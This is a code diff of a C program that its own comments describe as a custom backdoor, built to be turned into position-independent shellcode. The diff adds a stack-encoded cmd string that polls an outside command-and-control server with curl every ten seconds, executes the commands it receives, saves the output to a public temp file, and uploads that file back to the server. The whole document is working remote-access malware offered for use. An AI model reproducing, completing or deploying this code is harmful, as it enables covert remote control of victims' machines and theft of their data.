@@ -4,8 +4,8 @@
 //I've followed the methodology to create a complete custom backdoor communicating on c3 using https and APIs
 
 //This code is called position independent code because it doesn't depend on a linker to resolve external dependencies like importing dlls and using functions inside.
-//This backdoor uses cmd to get commands from the c3 server after every 6 seconds and execute it on the system.
-//Sending the output back on the c3 server is yet to be implemented!
+//This backdoor uses cmd to get commands from the c3 server after every 10 seconds and execute it on the system.
+//The executed command is saved into a text file and then uploaded back to the c3 server.
 //With the help of MSVC we can convert this code to .asm file and then link those assembly instructions to a binary.
 //After that we can extract shellcode from the .text section of that binary.
 
@@ -26,7 +26,8 @@ int main()
     char sleep_name[] = { 'S','l','e','e','p', 0 };
 
     // stack based strings to be passed to the winexec api
-    char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','"', 0};
+    //This string_cmd takes commands from the c3 server, executes those commands on the system, saves the output in a text file and then uploads the output back to the c3 server!
+    char cmd[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','"','f','o','r',' ','/','f',' ','"','d','e','l','i','m','s','=','"',' ','%','i',' ','i','n',' ','(','\'','c','u','r','l',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','d','a','t','a','.','p','h','p','\'',')',' ','d','o',' ','s','e','t',' ','o','u','t','p','u','t','=','%','i',' ','&','&',' ','%','i',' ','>',' ','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t',' ','&','&',' ','c','u','r','l',' ','-','-','f','o','r','m',' ','"','f','i','l','e','T','o','U','p','l','o','a','d','=','@','C',':','\\','u','s','e','r','s','\\','p','u','b','l','i','c','\\','t','e','m','p','.','t','x','t','"',' ','h','t','t','p','s',':','/','/','r','.','b','a','a','l','e','j','i','b','r','e','e','l','.','c','o','m','/','s','h','a','d','d','y','/','g','e','t','f','i','l','e','.','p','h','p','"',' ','"', 0};
 
 	// resolve kernel32 image base
     LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
@@ -65,10 +66,12 @@ int main()
         _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
             _In_ DWORD)) _GetProcAddress((HMODULE)base, sleep_name);
 
+    if (_Sleep == NULL) return 5;
+
     while(true)
 	{
 		UINT return_val = _WinExec(cmd, 0);
-        _Sleep(6000);
+        _Sleep(10000);
 	}
     //UINT return_val = _WinExec(cmd, 0);
 
